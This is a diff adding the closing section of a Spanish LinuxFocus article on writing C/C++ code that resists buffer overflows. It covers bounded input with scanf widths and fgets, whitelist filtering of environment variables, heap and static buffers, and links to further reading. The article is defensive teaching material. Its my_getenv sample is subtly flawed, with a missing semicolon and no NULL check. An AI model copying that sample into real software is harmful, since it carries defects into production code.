+En determinadas circunstancias es imposible truncarlo de esa manera (path, nombre de m&aacute;quina,
+URL... ) y las cosas deben hacerse antes en el programa tan pronto como los datos son escritos.
+
+<A NAME="lfindex7">&nbsp;</A>
+<H2>Validar los datos en dos pasos</H2>
+
+
+Un programa ejecut&aacute;ndose con privilegios distintos a aquellos de su usuario implica que usted
+protege todos sus datos y que considera sospechosos todos los datos entrantes.
+
+<P>En primer lugar, esto afecta a las routinas con una cadena como par&aacute;metro de entrada. De
+acuerdo con lo que acabamos de decir, no insistiremos en que usted <EM>nunca</EM> utilice
+<CODE>gets(char *array)</CODE> ya que nunca comprueba la longitud de la cadena (nota del
+autor: esta rutina deber&iacute;a ser prohibida por el editor de enlace para los nuevos programas
+compilados). Otros peligros esconde <CODE>scanf()</CODE>. La l&iacute;nea</P>
+
+<PRE>
+scanf ("%s", string)
+</PRE>
+
+es tan peligrosa como <CODE>gets(char *array)</CODE>, pero no es tan obvio. Pero funciones de
+la familia de <CODE>scanf()</CODE> ofrecen un mecanismo de control sobre el tama&ntilde;o de los
+datos:
+
+<PRE>
+  char buffer[256];
+  scanf("%255s", buffer);
+</PRE>
+
+Este formateo limita el n&uacute;mero de caracteres copiados en <CODE>buffer</CODE> hasta 255. Por
+otro lado, <CODE>scanf()</CODE> pone los caracteres que no le gustan de vuelta en la trama de
+entrada, por lo que los riesgos de errores de programaci&oacute;n que generan bloqueos son bastante altos.
+
+<P>Utilizando C++, la instrucci&oacute;n <CODE>cin</CODE> reeplaza las funciones cl&aacute;sicas utilizadas
+en C ( aunque se pueden seguir utilizando). El siguiente programa llena un b&uacute;fer:</P>
+
+<PRE>
+  char buffer[500];
+  cin&gt;&gt;buffer;
+</PRE>
+
+Como pueden observar, &iexcl;no hace ning&uacute;n test! Nos encontramos en una situaci&oacute;n similar a
+<CODE>gets(char *array)</CODE> que se utiliza en C: hay una puerta abierta de par en par. La
+funci&oacute;n miembro <CODE>ios::width()</CODE> permite fijar el n&uacute;mero m&aacute;ximo de caracteres a leer.
+
+<P>La lectura de datos requiere dos pasos. Una primera fase consiste en tomar la cadena con
+CODE>fgets(char *array, int size, FILE stream)</CODE>, esto limita el tama&ntilde;o del &aacute;rea utilizada.
+A continuaci&oacute;n los datos le&iacute;dos son formateados, por ejemplo con <CODE>sscanf()</CODE>. La
+primera fase puede hacer m&aacute;s cosas, como insertar autom&aacute;ticamente <CODE>fgets(char *array,
+int size, FILE stream)</CODE> en un bucle reservando la memoria requerida, sin unos l&iacute;mites
+arbitrarios. La extensi&oacute;n GNU <CODE>getline()</CODE> lo puede hacer por t&iacute;. Tambi&eacute;n es posible
+incluir la validaci&oacute;n de caracteres tecleados utilizando <CODE>isalnum()</CODE>, <CODE>isprint()</CODE>,
+etc. La funci&oacute;n <CODE>strspn()</CODE> permite un filtrado efectivo. El programa se vuelve un
+poco m&aacute;s lento, pero las partes sensibles del c&oacute;digo estan protegidas del datos ilegales con un chaleco
+antibalas.</P>
+
+<P>El tecleo directo de datos no es el &uacute;nico punto de entrada atacable. Los ficheros de datos del
+software son vulnerables, pero el c&oacute;digo escrito para leerlos generalmente es m&aacute;s robusto que
+el de la entrada por consola, ya que los programadores intuitivamente desconf&iacute;an del contenido
+del fichero proporcionado por el usuario.</P>
+
+<P>Los ataques por desbordamiento de b&uacute;fer se basan muchas veces en algo m&aacute;s: las cadenas de
+entorno. No debemos olvidar que un programador puede configurar completamente un entorno de
+proceso antes de lanzarlo. El convenio que dice que una variable de entorno debe ser del tipo
+"<CODE>NAME=VALUE</CODE>" puede ser explotado por un usuario malintencionado. Utilizar la
+rutina <CODE>getenv()</CODE> requiere cierta precauci&oacute;n, especialmente cuando se va a devolver
+la longitud de la cadena (arbitrariamente larga) y su contenido (donde usted puede encontrar
+cualquier car&aacute;cter, incluido `<CODE>=</CODE>'). La cadena devuelta con <CODE>getenv()</CODE>
+ser&aacute; tratada como la proporcionada por <CODE>fgets(char *array, int size, FILE stream)</CODE>,
+teniendo en cuenta su longitud y validando cada car&aacute;cter. </P>
+
+<P>El uso de estos filtros se hace igual que el acceso al ordenador: &iexcl;por defecto se proh&iacute;be
+todo! A continuaci&oacute;n se pueden permitir algunas cosas: </P>
+
+<PRE>
+  #define GOOD "abcdefghijklmnopqrstuvwxyz\
+                BCDEFGHIJKLMNOPQRSTUVWXYZ\
+                1234567890_"
+
+  char *my_getenv(char *var) {
+    char *data, *ptr
+
+    /* Getting the data */
+    data = getenv(var);
+
+    /* Filtering
+       Rem : obviously the replacement character must be
+             in the list of the allowed ones !!!
+    */
+    for (ptr = data; *(ptr += strspn(ptr, GOOD));)
+      *ptr = '_';
+
+    return data;
+  }
+</PRE>
+
+<P>La funci&oacute;n <CODE>strspn()</CODE> lo hace sencillo: busca el primer car&aacute;cter que no sea
+parte del comjunto correcto de caracteres. Devuelve la longitud de la cadena (comenzando en
+cero) manteniendo s&oacute;lo los caracteres v&aacute;lidos. Nunca debe darle la vuelta a la l&oacute;gica. No se
+puede validar contra los caracteres que usted no desea. Siempre se debe comprobar con los
+caracteres "buenos".</P>
+
+<A NAME="lfindex8">&nbsp;</A>
+<H2>Utilizar b&uacute;feres din&aacute;micos</H2>
+
+
+<P>El desbordamiento de b&uacute;fer se basa en que el contenido de la pila sobreescriba una variable
+y en la direcci&oacute;n de retorno de una funci&oacute;n. El ataque involucra datos autom&aacute;ticos, que s&oacute;lo se
+alojan en la pila. Una forma de mover el problema es reemplazar la tabla de caracteres alojada
+en la pila por variables din&aacute;micas que se encuentran en memoria. Para hacer esto sustituimos la secuencia:
+
+<PRE>
+  #define LG_STRING    128
+  int fonction (...)
+  {
+    char array [LG_STRING];
+    ...
+    return (result);
+  }
+</PRE>
+
+por :
+
+<PRE>
+  #define LG_STRING    128
+  int fonction (...)
+  {
+    char *string = NULL;
+    if ((string = malloc (LG_STRING)) == NULL)
+        return (-1);
+    memset(string,'\0',LG_STRING);
+    [...]
+    free (string);
+    return (result);
+  }
+</PRE>
+
+Estas l&iacute;neas hinchan el c&oacute;digo y crean riesgo de fugas de memoria, pero debemos aprovechar estos
+cambios para modificar la aproximaci&oacute;n y evitar imponer l&iacute;mites de longitud arbitrarios. Vamos a
+a&ntilde;adir que usted no puede esperar el mismo resultado utilizando <CODE>alloca()</CODE>. El c&oacute;digo parece
+similar pero alloca aloja los datos en la pila de proceso y esto conduce al mismo problema que
+las variables autom&aacute;ticas.
+Inicializar la memoria a cero utilizando <CODE>memset()</CODE> evita algunos problemas con las
+variables sin inicializar. De nuevo, esto no corrige el problema, simplemente el ataque se
+vuelve menos trivial. Aquellos que quieran profundizar en el tema pueden leer el art&iacute;culo sobre
+desbordamiento de la cima de la pila en w00w00.
+
+<P>Por &uacute;ltimo, digamos que en determinadas circunstancias es posible librarse r&aacute;pidamente de los
+agujeros de seguridad a&ntilde;adiendo la palabra <CODE>static</CODE> antes de la declaraci&oacute;n del b&uacute;fer.
+El compilador aloja esta variable en el segmento de datos lejos de la pila de proceso. Conseguir
+una shell se convierte en algo imposible, pero no soluciona el problema de un ataque por denegaci&oacute;n
+de servicio. Por supuesto, esto no funciona si la rutina es llamada de forma recursiva. Esta
+"medicina" debe ser considerada como un paliativo, utilizado &uacute;nicamente para eliminar un agujero
+de seguridad en una emergencia sin tener que modificar demasiado el c&oacute;digo.</P>
+
+<A NAME="lfindex9">&nbsp;</A>
+<H2>Conclusiones</H2>
+
+
+
+Esperamos que este breve repaso a los desbordamientos de b&uacute;fer les ayude a programar de forma
+m&aacute;s segura. Incluso si la t&eacute;cnica de ataque requiere una profunda comprensi&oacute;n del mecanismo,
+el fundamento general es bastante accesible. Por otro lado, la implementaci&oacute;n de precauciones no
+es tan complicada. No olviden que es m&aacute;s r&aacute;pido hacer un programa seguro en tiempo de dise&ntilde;o que
+parchear los fallos m&aacute;s adelante. Confirmaremos este principio en nuestro siguiente art&iacute;culo
+sobre <EM>bugs de formato</EM>.
+
+<A NAME="lfindex10">&nbsp;</A>
+<H2>Enlaces</H2>
+
+
+
+<UL>
+<LI>P&aacute;gina de Christophe Blaess : <A href=
+"http://perso.club-internet.fr/ccb/">perso.club-internet.fr/ccb/</A></LI>
+
+<LI>P&aacute;gina de Christophe Grenier : <A href=
+"http://www.esiea.fr/public_html/Christophe.GRENIER/">www.esiea.fr/public_html/Christophe.GRENIER/</A></LI>
+
+<LI>P&aacute;gina de Fr&eacute;d&eacute;ric Raynal : <A href=
+"http://www-rocq.inria.fr/~raynal/">www-rocq.inria.fr/~raynal/</A></LI>
+
+<LI>Phrack Magazine : <A href=
+"http://phrack.infonexus.com/">phrack.infonexus.com/</A>.</LI>
+
+<LI>Desbordamiento del monte de pila : <A href=
+"http://www.w00w00.org/files/articles/heaptut.txt">www.w00w00.org/files/articles/heaptut.txt</A></LI>
+</UL>
+
+
+
+<!-- 2pdaIgnoreStart -->
+<A NAME="talkback">&nbsp;</a>
+<h2>Formulario de "talkback" para este art&iacute;culo</h2>
+Cada art&iacute;culo tiene su propia p&aacute;gina de "talkback". A trav&eacute;s de esa p&aacute;gina puedes enviar un comentario o consultar los comentarios de otros lectores
+<center>
+<table border="0"  CELLSPACING="2" CELLPADDING="1">
+ <tr BGCOLOR="#C2C2C2"><td align=center>
+  <table border="3"  CELLSPACING="2" CELLPADDING="1">
+   <tr BGCOLOR="#C2C2C2"><td align=center>
+    <A href="http://cgi.linuxfocus.org/cgi-bin/lftalkback?anum=190&lang=es"><b>&nbsp;Ir a la p&aacute;gina de "talkback"&nbsp;</b></a>
+   </td></tr></table>
+</td></tr></table>
+</center>
+
+<HR size="2" noshade>
+<!-- ARTICLE FOOT -->
+<CENTER><TABLE WIDTH="95%">
+<TR><TD ALIGN=CENTER BGCOLOR="#9999AA">
+<A HREF="../../common/lfteam.html">Contactar con el equipo de LinuFocus</A>
+<BR><FONT COLOR="#FFFFFF">&copy;  Fr&eacute;d&eacute;ric Raynal, Christophe Blaess, Christophe Grenier, <a href="../../common/copy.html">FDL</a> <BR><a href="http://www.linuxfocus.org">LinuxFocus.org</a></FONT>
+<BR><a href="http://cgi.linuxfocus.org/cgi-bin/lfcomment?lang=es&article=article190.html" target="_TOP">Pinchar aqu&iacute; para informar de alg&uacute;n problema o enviar comentarios a LinuxFocus</A><BR></TD>
+<TD BGCOLOR="#9999AA"><!-- TRANSLATION INFO -->
+<font size=2>Informaci&oacute;n sobre la traducci&oacute;n:</font><TABLE>
+<tr><td><font size=2>fr</font></td>
+    <td><font size=2>-&gt;</font></td>
+    <td><font size=2>--</font></td>
+    <td><font size=2><a href="mailto:pappy@users.sourceforge.net,ccb@club-internet.fr,grenier@nef.esiea.fr"><FONT COLOR="#FFFFFF"> Fr&eacute;d&eacute;ric Raynal, Christophe Blaess, Christophe Grenier</FONT></a></font></td>
+</tr>
+<tr><td><font size=2>fr</font></td>
+    <td><font size=2>-&gt;</font></td>
+    <td><font size=2>en</font></td>
+    <td><font size=2><a href="mailto:georges.t@linuxfocus.org"><FONT COLOR="#FFFFFF">Georges Tarbouriech</FONT></a></font></td>
+</tr>
+<tr><td><font size=2>en</font></td>
+    <td><font size=2>-&gt;</font></td>
+    <td><font size=2>en</font></td>
+    <td><font size=2><a href="mailto:sherm_pbody@yahoo.com"><FONT COLOR="#FFFFFF">Lorne Bailey</FONT></a></font></td>
+</tr>
+<tr><td><font size=2>en</font></td>
+    <td><font size=2>-&gt;</font></td>
+    <td><font size=2>es</font></td>
+    <td><font size=2><a href="mailto:bblanco@crvasca.com"><FONT COLOR="#FFFFFF">Bego&ntilde;a Blanco</FONT></a></font></td>
+</tr>
+</TABLE></TD>
+</TR></TABLE></CENTER>
+<p><font size=1>2001-05-14, generated by lfparser version 2.9</font></p>
+<!-- 2pdaIgnoreStop -->
+</BODY>
+</HTML>
